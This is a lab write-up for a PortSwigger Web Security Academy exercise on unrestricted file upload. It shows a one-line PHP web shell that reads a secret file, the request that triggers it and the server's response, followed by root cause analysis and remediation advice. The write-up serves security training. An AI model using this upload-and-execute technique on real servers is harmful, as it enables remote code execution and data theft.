# Lab 01 — Remote Code Execution via Web Shell Upload

[![Category](https://img.shields.io/badge/Category-File%20Upload-indigo)]()
[![Type](https://img.shields.io/badge/Type-File%20Upload%20-%20No%20Validation-orange)]()
[![Difficulty](https://img.shields.io/badge/Difficulty-Apprentice-9cf)]()
[![Severity](https://img.shields.io/badge/Severity-Critical-critical)]()
[![Source](https://img.shields.io/badge/Source-PortSwigger%20Web%20Security%20Academy-blue)](https://portswigger.net/web-security/file-upload)

> Part of the [File Upload Labs](./README.md) series — PortSwigger Web Security Academy.

---

## 1. Overview

| Field | Detail |
|---|---|
| **Lab Name** | Remote Code Execution via Web Shell Upload |
| **Difficulty** | Apprentice |
| **Vulnerability Class** | File Upload — No Validation |
| **Weakness (CWE)** | CWE-434: Unrestricted Upload of File with Dangerous Type |
| **Severity** | Critical |
| **Objective** | Upload a basic PHP web shell and use it to exfiltrate the contents of /home/carlos/secret. |

## 2. Summary

The avatar image upload function performs no validation whatsoever on uploaded files — no extension check, no content-type check, no content inspection. Any file, including a raw `.php` script, is accepted and stored in a location the web server will both serve and execute as PHP.

## 3. Proof of Concept (PoC)

**Step 1 — Log in and locate the avatar upload:**  
Authenticate with `wiener:peter`, upload any image as your avatar, then return to the account page to see the preview.

**Step 2 — Find how the avatar is served:**  
In Burp, go to **Proxy > HTTP history**, filter by MIME type (Images), and find the `GET /files/avatars/<YOUR-IMAGE>` request. Send it to Repeater.

**Step 3 — Create the PHP web shell:**  
On your system, create `exploit.php`:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

**Step 4 — Upload it as your avatar:**  
Use the avatar upload function to submit `exploit.php` directly. The confirmation message indicates it uploaded successfully — no rejection at all.

**Step 5 — Trigger the shell:**  
In the Repeater tab, change the path to point at your file:

```http
GET /files/avatars/exploit.php HTTP/1.1
```

Send it. The server executes the script and returns Carlos's secret in the response.


## 4. Evidence (Request / Response)

```http
GET /files/avatars/exploit.php HTTP/1.1
Host: <lab-id>.web-security-academy.net

HTTP/1.1 200 OK
Content-Type: text/html

<secret-value-here>
```

## 5. Root Cause Analysis

The upload endpoint performs zero validation of any kind — no extension allow/deny-list, no MIME type check, no content inspection — and stores the file in a web-accessible, script-executing directory. This is the baseline, unmitigated form of the vulnerability that every other lab in this series adds a (bypassable) defense on top of.

### Attacker vs. Defender Perspective

- **Attacker view:** Try uploading a raw script with no obfuscation at all first — many real-world upload forms have no validation whatsoever.
- **Defender view:** Never assume validation exists; audit every upload endpoint for extension, content, and execution-location controls.

## 6. Impact

Complete, trivial remote code execution. Any authenticated user can run arbitrary PHP on the server, leading to full compromise of the application and potentially the underlying host.

## 7. Remediation

- Validate uploaded file extensions against a strict allow-list.
- Validate actual file content (magic bytes, re-encoding), not just the extension or client-supplied MIME type.
- Store uploads outside the web root, or in a location explicitly configured to never execute scripts.
- Generate a new, random filename server-side for every upload.

## 8. References

- [PortSwigger — File Upload Vulnerabilities](https://portswigger.net/web-security/file-upload)
- [OWASP — Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)

---

*Writeup produced for educational and authorized lab purposes only (PortSwigger Web Security Academy environment).*
